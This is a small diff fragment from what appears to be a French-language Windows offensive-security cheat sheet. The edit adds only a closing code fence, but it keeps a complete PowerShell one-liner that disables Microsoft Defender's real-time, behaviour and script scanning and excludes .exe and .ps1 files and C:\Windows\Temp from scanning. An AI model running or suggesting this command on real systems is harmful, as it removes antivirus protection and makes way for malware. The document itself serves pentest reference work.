@@ -508,7 +508,7 @@ En résumé, AMSI sert d'intermédiaire entre une application et un moteur antiv
 ### Désactiver Defender, exclusion de "C:\Windows\Temp", exclut les extension .exe et .ps1 
 ```powershell		
 Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true -DisableBlockAtFirstSeen $true -ExclusionExtension "ps1", "exe";Add-MpPreference -ExclusionPath "C:\Windows\Temp"
-
+```
 
 
 
